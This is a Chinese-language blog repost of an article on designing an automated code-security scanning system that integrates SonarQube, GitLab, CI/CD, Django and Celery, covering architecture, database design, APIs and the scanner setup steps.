
<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  

  <title>Pa55w0rd &#39;s Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="信息安全">
<meta property="og:type" content="website">
<meta property="og:title" content="Pa55w0rd &#39;s Blog">
<meta property="og:url" content="https://www.pa55w0rd.club/pa55w0rd-new.github.io/page/4/index.html">
<meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
<meta property="og:description" content="信息安全">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pa55w0rd &#39;s Blog">
<meta name="twitter:description" content="信息安全">

  

  


  


  



  
    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
  


  
    <link rel="icon" href="/img/favicon.ico">
  


  <link rel="stylesheet" href="/pa55w0rd-new.github.io/css/style.css">
  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->

  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
  <script src="/js/jquery.js" type="text/javascript"></script>
  <script src="/js/jquery.min.js" type="text/javascript"></script>
  <script src="/js/scrollReveal.js" type="text/javascript"></script>
  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
  <script src="/js/algolia-search.js" type="text/javascript"></script>
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
  
  






  
  
  <!-- 
  
  
  
  
   -->

  <script>
   var CONFIG = {
    root: '/',
    algolia: {
          applicationID: "",
          apiKey: "",
          adminApiKey: "",
          indexName: "",
          hits: {"per_page":10},
          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
        }
  };
  </script>

</head>


</html>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div data-scroll-reveal="enter top" id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/pa55w0rd-new.github.io/" id="logo">Pa55w0rd &#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/pa55w0rd-new.github.io/" id="subtitle">记录</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/about"><i class="fa fa-about" aria-hidden="true"></i>about</a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/categories"><i class="fa fa-categories" aria-hidden="true"></i>Categories</a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/tags"><i class="fa fa-tags" aria-hidden="true"></i>标签</a>
        
          <a class="main-nav-link" href="/pa55w0rd-new.github.io/about"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
        
        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
      </nav>
        <div id="local-search-input"></div>
      <!-- 百度搜索 -->
     <!-- <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="www.pa55w0rd.club/pa55w0rd-new.github.io">
        </form>
      </div>
      -->
   
    </div>
  </div>
</header>

    <div class="outer">
      <section id="main">
  
    <article id="post-代码自动化扫描系统建设" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/pa55w0rd-new.github.io/代码自动化扫描系统建设/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-22T06:58:04.000Z" itemprop="datePublished">2018-10-22</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/pa55w0rd-new.github.io/categories/安全建设/">安全建设</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/pa55w0rd-new.github.io/代码自动化扫描系统建设/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>代码自动化扫描系统的建设（转发）</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <p>转自</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设- 唯品会安全应急响应中心</a></p>
</blockquote>
<ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><h3 id="为什么需要自动化扫描？"><a href="#为什么需要自动化扫描？" class="headerlink" title="为什么需要自动化扫描？"></a>为什么需要自动化扫描？</h3><p>互联网的快速发展，程序员是功不可没的。从软件开发的瀑布模型到现在的敏捷开发, 软件的开发周期从数年到数月、从数月到数天，时间不断变换缩减。传统的代码扫描方式已经不能跟进新时代的软件开发流程中，这就需要改变我们的代码扫描方式，它应该在有限的时间内尽量发现足够多的安全问题，并能够结合 [<code>CI (持续集成)</code>]来触发代码扫描。</p>
<h3 id="自动化扫描时扫描引擎用什么？"><a href="#自动化扫描时扫描引擎用什么？" class="headerlink" title="自动化扫描时扫描引擎用什么？"></a>自动化扫描时扫描引擎用什么？</h3><p>你可以使用任何提供 API 接口的开源或商业的扫描引擎。这里我们把“扫描引擎”(指第三方的审计工具)与“自动化系统”剥离(解耦)开来，“扫描引擎”只负责安全漏洞扫描；“自动化系统”负责漏洞收集、分析、处理等动作。同时你也可以通过“自动化系统”的后台来添加一些安全规则。</p>
<h3 id="怎么触发自动化扫描？"><a href="#怎么触发自动化扫描？" class="headerlink" title="怎么触发自动化扫描？"></a>怎么触发自动化扫描？</h3><p>两种方式：</p>
<ul>
<li>管理后台手动触发</li>
<li>CI(持续集成)/[CD(持续交付)]系统中触发</li>
</ul>
<h3 id="如何解决漏报和误报？"><a href="#如何解决漏报和误报？" class="headerlink" title="如何解决漏报和误报？"></a>如何解决漏报和误报？</h3><p>两种方式：</p>
<p>“<code>基于规则</code>”和“<code>基于插件</code>”，这里使用白名单表示误报、使用黑名单表示漏报。</p>
<p><strong>基于规则</strong></p>
<p>这里的规则是指基于文本的处理方式，如：使用正则表达式来匹配文件中的某些特征，使用字符串来判断是否存在敏感信息等。</p>
<p><em>PS: 这里有一些细节需要注意。</em></p>
<ul>
<li><p>正则表达式：</p>
<ul>
<li>是否区分大小写</li>
<li>是否支持多行匹配</li>
</ul>
</li>
<li><p>字符串：</p>
<ul>
<li>是否首部包含</li>
<li>是否尾部包含</li>
<li>是否在当前字符串中</li>
</ul>
</li>
</ul>
<p><strong>基于插件</strong></p>
<p>插件的自由度较大，其本质是把要扫描的文件信息作为插件执行入口的上下文，文件信息包括：路径、名称、内容等。你也可以在插件中写一些判断逻辑或调用第三方工具。</p>
<h3 id="漏报率和误报率怎么样？"><a href="#漏报率和误报率怎么样？" class="headerlink" title="漏报率和误报率怎么样？"></a>漏报率和误报率怎么样？</h3><p>漏报率暂时无法很好的测量， <code>漏报率 = 漏报数/(漏洞数+漏报数) × 100%</code> 而实际中很少有人(这里指非安全审计人员)会发现漏报，理论上你写的规则或插件越多越会减少漏报。</p>
<p>误报是可以通过白名单规则或插件处理的，理论上可以百分百消除误报，但是需要手动进行设置。</p>
<h3 id="Web-通用型漏洞可以都覆盖么？"><a href="#Web-通用型漏洞可以都覆盖么？" class="headerlink" title="Web 通用型漏洞可以都覆盖么？"></a>Web 通用型漏洞可以都覆盖么？</h3><p>Web 通用型漏洞以 <code>OWASP 2017 TOP 10</code> 为例，其大多数都在黑盒测试的范围内。适用白盒测试仅限于：“<code>A3:2017-Sensitive Data Exposure</code>”、“<code>A9:2017-Using Components with Known Vulnerabilities</code>”，而这两项也是我们自动化扫描系统的基本要求。</p>
<h3 id="扫描出来的漏洞如何形成闭合？"><a href="#扫描出来的漏洞如何形成闭合？" class="headerlink" title="扫描出来的漏洞如何形成闭合？"></a>扫描出来的漏洞如何形成闭合？</h3><p>这需要结合公司自身的软件开发方式而定，大多数公司采用“<code>Gitlab</code>” + “<code>Confluence</code>” + “<code>Jira</code>” + “<code>Jenkins</code>”的工作方式，那么我们可以通过 <code>Jira</code> 或 <code>Gitlab</code>的 API 接口来创建问题工单。</p>
<h2 id="0x01-设计要求"><a href="#0x01-设计要求" class="headerlink" title="0x01 设计要求"></a>0x01 设计要求</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p><strong>系统功能：</strong></p>
<ul>
<li>尽量发现足够多的安全问题<ul>
<li>硬编码问题</li>
<li>敏感信息泄露</li>
<li>使用存在已知漏洞的组件</li>
<li>危险函数识别</li>
</ul>
</li>
<li>可集成第三方扫描引擎</li>
<li>可自动化处理误报</li>
<li>可通过 CI 方式触发扫描</li>
<li>可根据条件自动创建 Issue</li>
</ul>
<p><strong>扫描目标主要分为两种：</strong></p>
<p>一种为线上 Git 扫描；一种为离线扫描。</p>
<p>“<code>线上 Git 扫描</code>” 其主要应用场景为企业内部使用如 Gitlab 这种代码托管系统，我们定时同步 Gitlab 上的项目信息，通过 CI 来调用 API 接口进行扫描，自动化扫描就是这种模式，其执行流程为：<code>“后台服务定时同步项目” -&gt; &quot;API接口下发扫描任务&quot; -&gt; “后台调度执行扫描”</code>。</p>
<p>“<code>离线扫描</code>”其形式为审计人员手动上传一个 zip 或 rar 的源码包，扫描系统自动解压后进行代码扫描。</p>
<p>这两种模式的执行流程略有不同，所以后端实现也略有不同，第一种的执行流程要比第二种较为复杂，我们这里会以第一种方式来实现自动化扫描。</p>
<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p><strong>系统要求：</strong></p>
<ul>
<li>单个项目扫描控制在 20 分钟以内</li>
<li>支持调度节点监控</li>
<li>支持漏洞知识库管理</li>
<li>支持 API 接口</li>
<li>支持分布式部署, 方便扩展来提升扫描能力</li>
</ul>
<p>时间控制是为了保证 CI/CD 过程不会太长，避免影响项目发布。调度节点监控，这里存在两种情况：一种是调度进程的心跳监控；一种为扫描任务的超时监控。漏洞知识库主要为了与组件分析模块分析出的依赖组件进行漏洞匹配。API 接口是为了方便第三方(代指CI/CD)调用来下发扫描任务或查询结果。分布式部署方式，可以水平扩展来提高调度节点和API节点的处理速度与能力。</p>
<h3 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h3><p><strong>主要系统：</strong></p>
<ul>
<li>代码托管子系统</li>
<li>自动化扫描子系统</li>
<li>第三方扫描子引擎</li>
</ul>
<p>这里从整体角度来观察，大致分为三个子系统，<code>自动化扫描子系统</code>依赖<code>代码托管子系统</code>，但不依赖<code>扫描引擎(泛指第三方商业或开源审计产品)子系统</code>，这是由于<code>自动化扫描子系统</code>内部集成了组件漏洞识别、黑白名单规则、黑白名单插件等功能，最后我们用一张图来说明。</p>
<p><img src="\assets\img\auto_scan\1.png" alt=""></p>
<p>这里主要介绍了自动扫描系统的背景和要实现的目标，下面我们将会详细介绍各个层与模块的设计。</p>
<h2 id="0x02-系统设计"><a href="#0x02-系统设计" class="headerlink" title="0x02 系统设计"></a>0x02 系统设计</h2><h3 id="1-基础准备"><a href="#1-基础准备" class="headerlink" title="1 基础准备"></a>1 基础准备</h3><p>这里我们主要使用 Linux 来搭建我们的自动化扫描系统，按照设计的角色划分，我们这里需要三台 CentOS 7 的服务器，当然服务器可以是物理设备也可以是虚拟机，如果公司内部的扫描项目较多或为以后扩展考虑意见使用物理机。<br>服务器数量|操作系统|扫描引擎|数据库|开发语言|角色<br>–|–|–|–|–|–|<br>3台|CentOS 7| SonarQube | MySQL| Python| - UI+MySQL+MQ<br>- 扫描节点<br>- 第三方引擎（SonarQube）</p>
<p><strong>服务器划分:</strong></p>
<p>这里我们假定一个 codeaudit 域, 三台服务器的主机名称分别为：</p>
<ul>
<li>ui.codeaudit: 负责后台管理系统的部署，包括数据库、MQ。</li>
<li>task.codeaudit: 负责调度扫描引擎。</li>
<li>sonarqube.codeauit: SonarQube的后台服务端。</li>
</ul>
<h3 id="2-技术说明"><a href="#2-技术说明" class="headerlink" title="2 技术说明"></a>2 技术说明</h3><p>这里会讨论到所需的具体技术点，有些技术或方法可能不是最佳的方案，但是已经过我们测试检验是可行的。</p>
<p>以下为实际开发中用到的一些技能：</p>
<ul>
<li>Python/Django/Jquery/Celery</li>
<li>Gitlab API/Sonar API</li>
<li>Git/Gitlab CI/Jenkins</li>
<li>Centos 7/Shell</li>
<li>NFS/Nginx/uWSGI</li>
<li>MySQL/RabbitMQ/Redis</li>
<li>安全漏洞知识</li>
</ul>
<p><strong>CentOS 7</strong></p>
<p>CentOS 7 与 6 的版本会有一些区别，我们需要具有 Linux 的基本操作基础，了解 systemctl、firewall-cmd、crontab等命令；了解SELinux，修改SELinux状态；并能编写systemd的自启动脚本。</p>
<p><strong>Git</strong></p>
<p>了解 Git 的基本操作命令，使用 SSH 密钥的方式提交或拉取代码; 熟悉git clone、git log、git pull、git branch、git remote、git fetch、git for-each-ref、git ls-files等基本命令的操作。</p>
<p>例如：</p>
<ul>
<li>使用git for-each-ref来得到当前分支的最后一次 commit id；</li>
<li>使用git ls-files来判断项目中是否存在sonar-project.properties配置文件；</li>
<li>使用git log -n1 /path/file来获取文件最后一次 commit 的作者。</li>
</ul>
<p><strong>CI/CD</strong></p>
<p>不论是集成到 Gitlab CI 或是Jenkins, 我们都需要先了解项目上线的基本流程，如：开发的代码规范、测试环节（单元测试/功能测试）、发布部署环节等。一般我们会将代码扫描环节放在在测试环节后，发布部署前。</p>
<p><strong>Python</strong></p>
<p>这里我们使用Python进行后台的服务端开发，使用Django进行前台 UI 的开发，使用django-rest-swagger来开发 API 接口，使用Celery作为扫描任务的调度框架。</p>
<p><strong>数据库与中间件</strong></p>
<p>数据库我们选择使用 MySQL 5.7(或MariaDB, 他们在使用上没有太大的区别); Celery 的消息中间件可以使用 Redis 或是 RabbitMQ，这里你可以在开发的时候使用 Redis，正式部署时使用 RabbitMQ。</p>
<p><strong>安全漏洞知识</strong></p>
<ul>
<li>了解 OWASP TOP 10 的漏洞类型原理与解决方案；</li>
<li>了解 CWE 的漏洞信息；</li>
<li>了解公司主流的开发语言。</li>
</ul>
<h3 id="3-模块设计"><a href="#3-模块设计" class="headerlink" title="3 模块设计"></a>3 模块设计</h3><p>下图中我们自上而下按照逻辑大致划分了”四”层：UI层、存储层、服务层、任务调度扫描引擎层（由于任务调度与服务同在后台运行，所以又统称为服务层）。</p>
<p><img src="\assets\img\auto_scan\2.png" alt=""></p>
<ul>
<li><p>UI 层</p>
<p>  提供扫描系统的后台管理、API接口、漏洞知识库等一系列的交互功能入口，不同的人员或系统可以根据各自的需求通过不同的交互接口来满足自己需求。如：CI/CD系统可通过 API 接口创建扫描任务并获取扫描结果；安全审计人员可通过后台进行规则或插件的添加；开发人员可通过漏洞知识库来获取相关语言或技术的漏洞信息。</p>
</li>
<li><p>存储层</p>
<p>  主要包括关系型数据库、消息中间件(指MQ)、NFS(网络文件系统)，这里我们使用了 MySQL 5.7 的数据库； RabbitMQ 是作为 Celery 调度框架的消息中间件；NFS担当网络共享存储，用于存储代码与扫描日志。</p>
</li>
<li><p>调度层</p>
<p>  扫描任务的执行流程，主要可分为：</p>
<ul>
<li>初始化：扫描任务的环境初始化，如：日志目录、日志文件、加载插件、加载漏洞规则等；</li>
<li>分析项目：项目代码统计、依赖组件统计、漏洞知识库关联等；</li>
<li>扫描漏洞：调用第三方扫描引擎、统计扫描结果；</li>
<li>漏报处理：使用黑名单规则和插件进行扫描；</li>
<li>误报处理：使用白名单规则和插件进行误报处理；</li>
<li>闭环漏洞：针对高危漏洞在 GitLab 或 Jira 系统中创建一个 Issue。</li>
</ul>
</li>
<li><p>服务层</p>
<p>  后台的服务，其主要包括：GitLab 系统中的项目同步、报表生成、调度进程监控。</p>
</li>
</ul>
<h2 id="0x03-系统功能"><a href="#0x03-系统功能" class="headerlink" title="0x03 系统功能"></a>0x03 系统功能</h2><h3 id="1-数据库设计"><a href="#1-数据库设计" class="headerlink" title="1 数据库设计"></a>1 数据库设计</h3><p><strong>权限相关</strong></p>
<p>权限控制，这里使用 django 自带的权限表来进行权限控制，我们可以通过auth_group表来创建用户组，为不同的用户组赋予不同的角色权限auth_group_permissions，你可以访问<a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">官方地址</a> 来获得更多关于权限的信息。</p>
<p>django 权限表如下：</p>
<ul>
<li>auth_group</li>
<li>auth_group_permissions</li>
<li>auth_permission</li>
<li>auth_user</li>
<li>auth_user_groups</li>
<li>auth_user_user_permissions</li>
</ul>
<p><img src="\assets\img\auto_scan\3.png" alt=""></p>
<p><strong>项目相关</strong></p>
<p>项目表主要包括：项目组、项目、分支与TAG、统计信息、依赖组件、插件规则、扫描任务等相关表。</p>
<p><img src="\assets\img\auto_scan\4.png" alt=""></p>
<p><strong>漏洞知识库</strong></p>
<p>漏洞知识库，这里主要存储漏洞类型、漏洞知识等内容。</p>
<p><img src="\assets\img\auto_scan\5.png" alt=""></p>
<p><strong>系统相关</strong></p>
<p>系统表主要包括系统的安全周报、节点监控、系统日志等信息。</p>
<p><img src="\assets\img\auto_scan\6.png" alt=""></p>
<h3 id="2-UI系统"><a href="#2-UI系统" class="headerlink" title="2 UI系统"></a>2 UI系统</h3><p>扫描系统的后台，方便安全审计人员管理项目和系统。</p>
<h4 id="2-1-项目管理"><a href="#2-1-项目管理" class="headerlink" title="2.1 项目管理"></a>2.1 项目管理</h4><p><strong>2.1.1 项目组</strong></p>
<p>项目组我们通过 GitLab 的 API 同步所有项目组信息到我们的扫描系统，项目组的信息包括：<code>项目组名称、项目组描述、创建时间、URL地址、项目成员</code>等。</p>
<p><strong>2.1.2 项目</strong></p>
<p>项目是从分组中获取得到，需要注意的是可能会存在项目名相同但分组不同的情况。项目基本信息应包括：项目名称、项目描述、所属分组、默认分支、Git地址、项目成员、代码统计、依赖组件、分支管理、TAG管理等。</p>
<p><img src="\assets\img\auto_scan\7.png" alt=""></p>
<p><strong>2.1.3 扫描任务</strong></p>
<p>扫描任务会有四种状态：等待调度、正在扫描、扫描完成、扫描失败。每一次创建扫描任务时，都会查询是否存在等待调度或正在扫描的任务，如果存在则提示创建失败。</p>
<p><img src="\assets\img\auto_scan\8.png" alt=""></p>
<h4 id="2-2-规则插件"><a href="#2-2-规则插件" class="headerlink" title="2.2 规则插件"></a>2.2 规则插件</h4><p><strong>2.2.1 规则</strong></p>
<p>这里使用正则表达式来做特征匹配，并可通过限定文件的后缀来提高精准度。</p>
<p>正则表达式标志位：</p>
<ul>
<li>忽略大小写</li>
<li>支持多行匹配</li>
</ul>
<p><img src="\assets\img\auto_scan\9.png" alt=""></p>
<p><strong>2.2.2 插件</strong></p>
<p>这里使用了 Python 的反射机制，任务初始化时会优先初始化插件，当扫描完成时，扫描引擎会使用插件批量进行检测。插件入口函数为run()，漏洞详情对象会作为**kwargs参数的上下文传到该函数中。</p>
<p><img src="\assets\img\auto_scan\10.png" alt=""></p>
<p><strong>2.2.3 规则知识库</strong></p>
<p>规则知识库是区别与漏洞知识库的，往往规则知识库的内容要比漏洞知识库的内容简单，但是结构清晰。如：漏洞示例代码、漏洞说明、解决办法、参考链接等信息。</p>
<p><img src="\assets\img\auto_scan\11.png" alt=""></p>
<h4 id="2-3-漏洞知识库"><a href="#2-3-漏洞知识库" class="headerlink" title="2.3 漏洞知识库"></a>2.3 漏洞知识库</h4><p><strong>2.3.1 漏洞类型</strong></p>
<p>这里建议使用 CWE 的漏洞标准，可参考这个文档：<a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">文档1</a></p>
<p><img src="\assets\img\auto_scan\12.png" alt=""></p>
<p><strong>2.3.2 漏洞管理</strong></p>
<p>主要包括添加漏洞和管理漏洞，漏洞的信息应该包括：CVE/CNVD/CNNVD编号、漏洞标题、风险等级、漏洞来源、发现时间、受影响范围、漏洞详情、漏洞类型、解决版本等基本信息。</p>
<p><img src="\assets\img\auto_scan\13.png" alt=""></p>
<p>这里我们要实现漏洞知识库与识别出的组件联动功能，主要通过两个属性：</p>
<ul>
<li><p>组件标签</p>
<p>  这里需要为每个漏洞添加一个 Tag 属性，其属性值如：org.springframework、com.alibaba.fastjson，建议标签一律使用小写字母。</p>
</li>
<li><p>版本规则</p>
<p>  使用正则表达式来进行匹配，如：CVE-2018-1270 中受影响的 Spring Framework 版本为：5.0.x-5.0.5 和 4.3.x-4.3.16，那么我们的规则可以写成如下：</p>
<p>  <img src="\assets\img\auto_scan\14.png" alt=""></p>
</li>
</ul>
<h4 id="2-4-报表管理"><a href="#2-4-报表管理" class="headerlink" title="2.4 报表管理"></a>2.4 报表管理</h4><p><strong>2.4.1 语言与项目统计</strong></p>
<p>按照年份进行项目的语言统计</p>
<p><img src="\assets\img\auto_scan\15.png" alt=""></p>
<p><strong>2.4.2 周期性漏洞统计</strong></p>
<blockquote>
<p>每季度漏洞数对比</p>
</blockquote>
<p>季度统计是为了对比同一段时期的漏洞数。</p>
<p><img src="\assets\img\auto_scan\16.png" alt=""></p>
<blockquote>
<p>高危漏洞趋势图</p>
</blockquote>
<p>高危漏洞环比，今年实施的安全政策是否合乎预期，可以大概分析出来。</p>
<p><img src="\assets\img\auto_scan\17.png" alt=""></p>
<h3 id="3-API接口"><a href="#3-API接口" class="headerlink" title="3 API接口"></a>3 API接口</h3><h4 id="3-1-接口认证"><a href="#3-1-接口认证" class="headerlink" title="3.1 接口认证"></a>3.1 接口认证</h4><p>使用 rest_framework 的 API 来做验证，首先根据登陆的用户 id 生成一个 Token。</p>
<p><img src="\assets\img\auto_scan\18.png" alt=""></p>
<p>验证接口使用说明，添加 Authorization 的认证 Token。</p>
<p><img src="\assets\img\auto_scan\19.png" alt=""></p>
<h4 id="3-2-项目信息接口"><a href="#3-2-项目信息接口" class="headerlink" title="3.2 项目信息接口"></a>3.2 项目信息接口</h4><p><strong>信息同步</strong></p>
<p>为什么需要信息同步？这是因为 GitLab 中的项目名称可能不是最终上线的 APP 名称(这里有些绕)。拿一个 Java 的项目举例，该项目的 GitLab 地址为：<a href="http://git.companyname.com/A/cloud，那么这个Java的包名有可能是" target="_blank" rel="noopener">http://git.companyname.com/A/cloud，那么这个Java的包名有可能是</a> com.companyname.cloud。</p>
<p>我们使用项目的 git 地址来同步信息，建议把 git 地址全部转换为小写。APP 的名称(包名)可以 CI/CD 系统获取或是通过配置文件的硬编码方式来定义。</p>
<p><img src="\assets\img\auto_scan\20.png" alt=""></p>
<p><strong>创建扫描</strong></p>
<p>信息同步完成后，我们就可以根据 APP 名称和 git 地址来创建一个扫描任务，请求参数参考如下：</p>
<ul>
<li>app_name: APP名称(可选)</li>
<li>module_name: 模块名称(可选)</li>
<li>version: 当前版本(可选)</li>
<li>git_url: git地址 (必选)</li>
<li>branch_name: 分支名称(必选)</li>
</ul>
<h4 id="3-3-任务信息接口"><a href="#3-3-任务信息接口" class="headerlink" title="3.3 任务信息接口"></a>3.3 任务信息接口</h4><ul>
<li><p>查询扫描任务</p>
<p>  根据项目的 git 地址、分支来查询扫描任务，你也可以根据上一步创建扫描任务的 ID 来查询扫描结果。</p>
</li>
<li><p>查询任务漏洞列表</p>
<p>  当扫描任务状态为扫描完成/扫描失败时，就可以根据任务 ID 来查询扫描出的安全漏洞信息。</p>
</li>
</ul>
<h4 id="3-4-漏洞规则接口"><a href="#3-4-漏洞规则接口" class="headerlink" title="3.4 漏洞规则接口"></a>3.4 漏洞规则接口</h4><ul>
<li><p>查询漏洞规则知识</p>
<p>  通过漏洞信息中的漏洞规则 ID 或者 Key 来查询相关的规则知识库，该知识库应当包括：漏洞原因、漏洞示例代码、解决修复意见等。</p>
</li>
</ul>
<h3 id="4-后台服务"><a href="#4-后台服务" class="headerlink" title="4 后台服务"></a>4 后台服务</h3><h4 id="4-1-gitlab-的信息同步"><a href="#4-1-gitlab-的信息同步" class="headerlink" title="4.1 gitlab 的信息同步"></a>4.1 gitlab 的信息同步</h4><p>使用 crontab 每两个小时遍历一遍 GitLab 上的所有项目，并同步项目信息到扫描系统中。</p>
<p><img src="\assets\img\auto_scan\21.png" alt=""></p>
<h4 id="4-2-报表生成服务"><a href="#4-2-报表生成服务" class="headerlink" title="4.2 报表生成服务"></a>4.2 报表生成服务</h4><p>使用 crontab 每日凌晨12点生成，季度对比和年度的安全统计数据。</p>
<h4 id="4-3-扫描进程监控"><a href="#4-3-扫描进程监控" class="headerlink" title="4.3 扫描进程监控"></a>4.3 扫描进程监控</h4><p>使用ps aux| grep codescan来查看进程是否存活，当然这种暴力方式不能检测到进程的业务健康度的(比如：扫描任务卡死，状态一直为：正在扫描)。</p>
<h3 id="5-SonarQube-搭建"><a href="#5-SonarQube-搭建" class="headerlink" title="5 SonarQube 搭建"></a>5 SonarQube 搭建</h3><h4 id="5-1-服务搭建"><a href="#5-1-服务搭建" class="headerlink" title="5.1 服务搭建"></a>5.1 服务搭建</h4><p>下载最新版本<a href="https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行</a> sh ./sonar.sh start。 SonarQube 启动成功后，使用浏览器打开<a href="http://192.168.10.3:9000" target="_blank" rel="noopener">http://192.168.10.3:9000</a>, 输入 admin/admin 即可正常访问。</p>
<h4 id="5-2-插件管理"><a href="#5-2-插件管理" class="headerlink" title="5.2 插件管理"></a>5.2 插件管理</h4><p>SonarQube 6.4 版本登陆的后台管理系统，选择 “配置” -&gt; “系统” -&gt; “更新中心” ， 选择对应插件点击 “Install” 进行安装。</p>
<p>SonarQube 7.3 版本， “Administration” -&gt; “Marketplace”， 选择对应插件点击 “Install” 进行安装。</p>
<p><img src="\assets\img\auto_scan\22.png" alt=""></p>
<h3 id="6-引擎调度"><a href="#6-引擎调度" class="headerlink" title="6 引擎调度"></a>6 引擎调度</h3><p>程序部署在 “task.codeaudit” 服务器上，服务需要安装 cloc 与 sonar-scanner 工具。</p>
<h4 id="6-1-代码同步"><a href="#6-1-代码同步" class="headerlink" title="6.1 代码同步"></a>6.1 代码同步</h4><p>同步代码分为以下几个步骤：</p>
<ul>
<li><p>克隆项目</p>
<p>  这里可能会遇到一些坑，比如项目历史比较久远，完整克隆下来可能会达到上百M或G，我们这里可以使用–depth 1参数进行克隆下载。有的项目可能会存在不规范的情况，比如拿 git 当 svn 使用，每个版本创建一个目录。</p>
</li>
<li><p>切换分支</p>
<p>  根据扫描任务中的分支名称 checkout 到指定分支。</p>
</li>
<li><p>更新代码</p>
<p>  针对已经克隆的项目进行 pull 操作，来同步 GitLab 上的项目更新代码。</p>
</li>
</ul>
<h4 id="6-2-sonar-scanner-扫描"><a href="#6-2-sonar-scanner-扫描" class="headerlink" title="6.2 sonar-scanner 扫描"></a>6.2 sonar-scanner 扫描</h4><p>ssh 登录到task.codeaudit服务器上，执行cd opt &amp;&amp; wget <a href="https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip" target="_blank" rel="noopener">https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip</a> &amp;&amp; unzip sonar-scanner-cli-3.2.0.1227-linux.zip来下载并解压，执行成功后使用ln -s /opt/sonar-scanner-3.2.0.1227-linux/bin/sonar-scanner /usr/bin/sonar-scanner命令创建一个sonar-scanner 的软连接。这里我们会使用sonar-scanner命令来进行项目的代码扫描。</p>
<p>你也可以通过<a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。</a></p>
